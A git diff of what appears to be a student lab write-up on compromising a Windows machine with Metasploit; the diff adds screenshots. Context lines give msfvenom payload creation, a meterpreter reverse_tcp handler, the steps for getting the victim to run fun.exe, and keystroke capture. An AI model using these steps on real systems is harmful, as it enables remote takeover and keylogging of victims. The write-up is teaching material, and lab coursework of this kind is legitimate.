@@ -3,8 +3,6 @@ Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
 
-### Developed By
-
 # AIM:
 
 To Compromise windows using Metasploit .
@@ -62,6 +60,7 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
+<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_11" src="https://github.com/user-attachments/assets/85c0e8b6-f33e-4bda-8167-db332a162ba3" />
 
 
 
@@ -69,6 +68,7 @@ Create a malicious executable file fun.exe using msenom command ``` msfvenom -p 
 
 ### Output:
 
+<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_35" src="https://github.com/user-attachments/assets/be515fa0-cc19-48d7-a2c1-34a22accb9e1" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
@@ -89,6 +89,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_52" src="https://github.com/user-attachments/assets/62a943a5-7812-4713-aa64-af2c1b122566" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -97,6 +98,8 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
+
+<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_01" src="https://github.com/user-attachments/assets/3cd0bceb-a958-45d8-91ce-cb51238c1b06" />
 
 
 
@@ -112,9 +115,9 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
+<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_21" src="https://github.com/user-attachments/assets/9a1044ce-b2ce-43a7-9c68-41bedc450331" />
 
 
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
-
